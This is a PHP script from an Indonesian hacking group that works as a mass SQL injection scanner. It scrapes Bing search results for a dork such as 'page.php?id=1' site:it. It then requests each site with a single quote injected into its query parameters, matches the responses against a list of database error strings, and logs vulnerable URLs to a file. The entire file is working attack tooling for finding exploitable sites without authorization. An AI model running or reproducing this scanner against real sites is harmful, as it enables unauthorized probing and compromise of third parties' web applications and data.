<?php
// SQL Scanner via Bing Dorker
// Magelang1337
// usage: php sql.php 'bing_dorker'
// ex: php sql.php '"page.php?id=1" site:it'

set_time_limit(0);
error_reporting(0);
@ini_set('memory_limit', '64M');
@header('Content-Type: text/html; charset=UTF-8');

function cover() {
	print " ******        SQL Scanner via Bing Dorker         ******\n";
	print " *****      Coded by l0c4lh34rtz - IndoXploit       *****\n";
	print " ****                Magelang1337.com                ****\n";
	print " ***          usage: php sql.php 'bing_dork'          ***\n";
	print " **    ex: php sql.php '\"page.php?id=1\" site:it'       **\n\n";
}
$error[] = 'You have an error in your SQL';
$error[] = 'supplied argument is not a valid MySQL result resource in';
$error[] = 'Division by zero in';
$error[] = 'Call to a member function';
$error[] = 'Microsoft JET Database';
$error[] = 'ODBC Microsoft Access Driver';
$error[] = 'Microsoft OLE DB Provider for SQL Server';
$error[] = 'Unclosed quotation mark';
$error[] = 'Microsoft OLE DB Provider for Oracle';
$error[] = 'Incorrect syntax near';
$error[] = 'SQL query failed';
$error[] = 'Warning: filesize()';
$error[] = 'Warning: preg_match()';
$error[] = 'Warning: array_merge()';
$error[] = 'Warning: mysql_query()';
$error[] = 'Warning: mysql_num_rows()';
$error[] = 'Warning: session_start()';
$error[] = 'Warning: getimagesize()';
$error[] = 'Warning: mysql_fetch_array()';
$error[] = 'Warning: mysql_fetch_assoc()';
$error[] = 'Warning: is_writable()';
$error[] = 'Warning: Unknown()';
$error[] = 'Warning: mysql_result()';
$error[] = 'Warning: pg_exec()';
$error[] = 'Warning: require()';

function getsource($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
function inject($url) {
	$data = getsource(str_replace("=", "='", $url));
    $errors = implode("|", $GLOBALS['error']);
    return preg_match("#{$errors}#i", $data);
}
function simpen($isi) {
	$f = fopen("result_sql.txt","a+");
	fwrite($f, "$isi\n");
	fclose($f);
}

$do = urlencode($argv[1]);
if(isset($argv[1])) {
	cover();
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$do."&first=".$npage);
	    if($x) {
	        preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
	        foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
	        $npage = $npage + 10;
	        if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
	    } else break;
	}
	foreach($allLinks as $url) {
		$urls = parse_url($url, PHP_URL_HOST);
		$urls = "http://$urls/";
		if($_SESSION[$urls]) {
			//
		} else {
			$_SESSION[$urls] = "1";
			if(inject($url)) {
				print " $url -> Vuln!!\n";
				simpen($url);
			}
		}
	}
} else {
	print "usage: php ".$argv[0]." 'bing_dork'\n";
	print "ex: php ".$argv[0]." '\"page.php?id=1\" site:it'\n";
}
?>
